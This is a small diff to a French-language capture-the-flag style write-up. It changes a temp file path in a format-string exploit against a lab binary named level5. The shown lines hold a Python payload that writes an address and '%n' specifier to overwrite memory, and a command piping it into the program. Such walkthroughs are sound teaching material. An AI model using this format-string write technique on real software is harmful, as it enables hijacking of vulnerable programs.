@@ -156,8 +156,8 @@ Notre chaine de caractères à envoyer au programme sera la suivante :
 ```
 On exécute donc :
 ```
-python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/command
+python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /var/tmp/command
 ```
 ```
-cat /tmp/command - | ./level5
+cat /var/tmp/command - | ./level5
 ```
